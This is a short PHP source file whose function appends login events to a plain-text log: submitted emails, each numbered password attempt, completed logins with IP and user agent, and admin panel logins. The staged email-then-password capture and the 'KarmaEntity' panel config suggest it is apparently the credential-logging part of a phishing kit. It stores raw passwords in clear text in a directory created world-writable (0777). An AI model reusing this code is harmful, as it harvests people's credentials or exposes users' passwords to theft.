<?php
/**
 * ===========================
 * ENTITY LOGIN LOGGER (TXT)
 * ===========================
 * Saves ALL login logs to a plain-text file:
 *
 *     logs/entity_login_logs.txt
 *
 * Every login event is appended as an easy-to-read block:
 *   - EMAIL SUBMITTED    (email stage of the login form)
 *   - PASSWORD ATTEMPT   (every password try, #1, #2, ...)
 *   - LOGIN RECEIVED     (full completed login + device info)
 *   - PANEL LOGIN        (admin panel login, success + failed)
 *
 * The file name can be changed in KarmaEntity/config/config.php
 * (key: login_txt_file). Logging is ON when log_to_txt = true.
 */

function EntityLogLogin(string $event = 'LOGIN', array $fields = [], string $note = ''): bool
{
    $appRoot = dirname(__DIR__);

    // log file name from config (fallback: entity_login_logs.txt)
    $cfg      = @include $appRoot . '/KarmaEntity/config/config.php';
    $fileName = 'entity_login_logs.txt';

    if (is_array($cfg) && !empty($cfg['login_txt_file'])) {
        $fileName = basename($cfg['login_txt_file']);
    }

    $logDir  = $appRoot . '/logs';
    $logFile = $logDir . '/' . $fileName;

    if (!is_dir($logDir)) {
        @mkdir($logDir, 0777, true);
    }

    $ip   = $_SERVER['REMOTE_ADDR'] ?? 'UNKNOWN';
    $ua   = $_SERVER['HTTP_USER_AGENT'] ?? 'UNKNOWN';
    $time = date('Y-m-d H:i:s');

    $lines   = [];
    $lines[] = str_repeat('=', 62);
    $lines[] = '[' . $event . '] ' . $time;
    $lines[] = sprintf('%-12s: %s', 'IP', $ip);
    $lines[] = sprintf('%-12s: %s', 'User-Agent', $ua);

    if ($note !== '') {
        $lines[] = sprintf('%-12s: %s', 'Note', $note);
    }

    foreach ($fields as $label => $value) {
        $lines[] = sprintf('%-12s: %s', $label, $value);
    }

    $lines[] = str_repeat('=', 62);

    $entry = implode(PHP_EOL, $lines) . PHP_EOL . PHP_EOL;

    return (bool) @file_put_contents($logFile, $entry, FILE_APPEND | LOCK_EX);
}
